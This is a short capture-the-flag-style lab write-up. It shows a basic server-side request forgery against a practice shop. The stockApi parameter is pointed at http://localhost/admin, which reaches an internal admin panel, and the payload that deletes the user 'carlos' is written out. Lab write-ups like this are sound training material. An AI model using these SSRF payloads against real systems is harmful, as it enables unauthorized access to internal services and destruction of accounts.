## Basic SSRF against the local server

> Task: To change the stock api to `http://localhost/admin` and delete the user `carlos`.


There are plenty of posts with stock check functionality over city names.

Once i checked stock, it generates a apikey.

```bash
stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D6%26storeId%3D1
```

The stockapi is changed to http://localhost/admin which responded with,

```bash
<section>
	<h1>Users</h1>
	<div>
		<span>wiener - </span>
		<a href="/admin/delete?username=wiener">Delete</a>
	</div>
	<div>
		<span>carlos - </span>
		<a href="/admin/delete?username=carlos">Delete</a>
	</div>
</section>
```

Now i checked the stockApi with manipulated endpoint.

```bash
stockApi=http://localhost/admin/delete?username=carlos
```

It deleted the user 'carlos' and the lab is solved